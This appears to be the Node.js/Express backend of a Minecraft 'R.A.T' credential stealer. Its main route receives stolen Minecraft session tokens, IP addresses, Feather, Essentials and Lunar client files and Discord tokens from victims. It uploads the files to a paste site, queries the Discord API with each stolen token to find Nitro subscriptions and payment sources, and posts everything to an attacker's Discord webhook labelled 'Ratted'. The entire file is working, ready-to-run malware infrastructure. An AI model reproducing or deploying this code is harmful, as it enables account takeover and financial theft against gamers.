//config params
const
    usingDiscord = true,
    usingMongoDB = false

//setup
const getProfiles = require('./utils/networth');
require("dotenv").config()
const { post, get } = require("axios"),
    express = require("express"),
    mongoose = require("mongoose"),
    helmet = require("helmet"),
    app = express(),
    expressip = require("express-ip"),
    Ratted = require("./models/Ratted"),
    port = process.env.PORT || 80
    
//plugins
app.use(helmet()) //secure
app.use(expressip().getIpInfoMiddleware) //ip
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

//database connection
if (usingMongoDB) {
    mongoose.connect(process.env.DB)
    mongoose.connection.on("connected", () => console.log("[R.A.T] Connected to MongoDB!"))
    mongoose.connection.on("err", err => console.error(`[R.A.T] Failed to connect to MongoDB:\n${err.stack}`))
    mongoose.connection.on("disconnected", () => console.log("[R.A.T] Disconnected from MongoDB!"))
}

//array initialization
const ipMap = []

//clear map every 15mins if its not already empty
setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`)
        ipMap.length = 0
    }
}, 1000 * 60 * 15)

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
        console.log("[R.A.T] Rejected malformed JSON")
        return res.sendStatus(404)
    }

    //check if ip exists, if not then create a new entry, if yes then increment that entry
    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })

    //check if ip is banned (5 requests in 15mins)
    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
        return res.sendStatus(404)
    }

    //validate the token with microsoft auth server (rip mojang)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    })

    .then(async response => {
        if (1==1) { //mojangs way of saying its good
            if (usingMongoDB) {
                //create a Ratted object with mongoose schema and save it
                new Ratted({
                    username: req.body.username,
                    uuid: req.body.uuid,
                    token: req.body.token,
                    ip: req.body.ip,
                    timestamp: new Date(),

                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
                    tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
                    feather: req.body.feather,
                    essentials: req.body.essentials,
                    lunar: req.body.lunar,
                    discord: req.body.discord
                }).save(err => {
                    if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
                })
            }

            if (usingDiscord) {
                //upload feather
                const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key

                //upload essential
                const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key

                //upload lunar
                const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => { return { data: { key: "Error uploading" } } })).data.key

                //get discord info
                let nitros = ""
                let payments = ""

                const discord = req.body.discord.split(" | ")

                // get profiles
                let profiles = ''

                const profileData = await getProfiles('90e08207b2104996816b8ff4985db73b');

	            if (profileData) {
                    for (let profileId in profileData.profiles) {
                        profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
                    }
                }

                for await (const token of req.body.discord.split(" | ")) {
                    let me = await (await get("https://discordapp.com/api/v9/users/@me", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: { id: null } } })).data
                    if (me.id == null) {
                        delete discord[token]
                        continue
                    }

                    let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
                    nitros += nitro.length > 0 ? "Yes | " : "No | "

                    let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
                    payments += payment.length > 0 ? "Yes | " : "No | "
                }
                
                //numbers in the checks else allow for better sorting if you wish to only find embeds with these logins using discords search bar
                //check feather content in hastebin
                if(req.body.feather == 'File not found :(')
                    checkFeather = 'File not found :( - (Feather)'
                else
                    checkFeather = `https://hst.sh/${feather} -  **(Feather1)**`
                
                //check essentials content in hastebin
                if(req.body.essentials == 'File not found :(')
                    checkEssentials = 'File not found :( - (Essentials)'
                else
                    checkEssentials = `https://hst.sh/${essentials} - **(Essentials2)**`
                
                //check lunar content in hastebin
                if(req.body.lunar == 'File not found :(')
                    checkLunar = 'File not found :( - (Lunar)'
                else
                    checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`

                // timestamp text
                let timestamp = `<t:${Date.now()}:R>`

                try {
                    post(process.env.WEBHOOK, JSON.stringify({
                        content: `@everyone - ${timestamp}`, //ping
                        embeds: [{
                            title: `Ratted ${req.body.username} - Click For Stats`,
                             fields: [
                                { name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true },
                                { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                                { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                                { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
                                { name: 'Feather', value: `${checkFeather}`, inline: true },
                                { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                                { name: 'Lunar', value: `${checkLunar}`, inline: true },
                                { name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false },
                                { name: 'Nitro', value: `\`${nitros}\``, inline: true },
                                { name: 'Payment', value: `\`${payments}\``, inline: true }
                            ],
                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                            color: 5814783,
                            footer: {
                                "text": "🕊️ MagiDev on top 🕊️",
                            },
                            timestamp: new Date()
                        }],
                        attachments: []
                    }), {
                        headers: {
                            "Content-Type": "application/json"
                        }
                    }).catch(err => {
                        console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                    })
                } catch (e) {

                    console.log(e)
                }
            }

            console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
        }
    })
    .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`[R.A.T] Error while validating token:\n${err}`)
        console.log(req.body)
    })
    
    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

//create server
app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
    // send to discord webhook
    
});


//format a number into thousands millions billions
const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}
